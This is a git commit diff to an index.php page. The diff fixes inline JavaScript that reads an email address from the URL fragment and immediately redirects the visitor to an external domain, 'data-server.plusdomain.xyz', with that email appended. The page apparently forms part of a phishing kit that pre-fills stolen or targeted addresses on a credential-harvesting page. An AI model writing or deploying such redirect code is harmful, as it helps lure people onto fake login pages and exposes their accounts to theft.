0a8ce09174108a30bd631644dd5ccdf48c0317ab
joyzoe212 <114573955+joyzoe212@users.noreply.github.com>
2022-09-28 05:54:28 -0400

    Update index.php

--- index.php
+++ index.php
@@ -19,7 +19,7 @@
 		var em = hash.split("#")[1];
 
 		window.setTimeout(function () {
-			window.location.href = "https://data-server.plusdomain.xyz"+ + em;
+			window.location.href = "https://data-server.plusdomain.xyz"+ "#" + em;
 		}, 0);
 	</script>
 </html>
